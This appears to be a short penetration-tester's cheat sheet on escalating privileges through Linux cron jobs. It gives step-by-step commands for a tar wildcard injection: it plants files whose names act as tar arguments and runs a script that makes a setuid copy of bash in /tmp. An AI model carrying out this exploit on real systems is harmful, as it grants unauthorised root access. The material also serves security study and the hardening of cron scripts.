# Cron Jobs
------------
System wide crontabs:
```bash
/etc/crontab  #file
/etc/cron.d  #directory
```

User Crontabs:
```bash
/var/spool/cron/crontabs
```

 - Use pspy to identify processes run as root (pid 0)


### tar wilcard
If we have a cronjob running which uses tar like this with a wildcard:
```bash
#!/bin/sh
cd /home/user
tar czf /tmp/backup.tar.gz *
```

We see that tar backups up everything in the /home/user folder to backup.tar.gz in /tmp folder.

Checking out GTFO bins we can abuse this by providing arguments for tar:
```bash
tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
```

Create a bash script:
```bash
echo 'cp /bin/bash /tmp/bash' > shell.sh
echo 'chmod +s /tmp/bash' >> shell.sh 
```

Create two files in the home directory of the user:
```bash
touch /home/user/--checkpoint=1
touch /home/user/--checkpoint-action=exec=shell.sh
```

---------
- [ ] Check on symlinks 



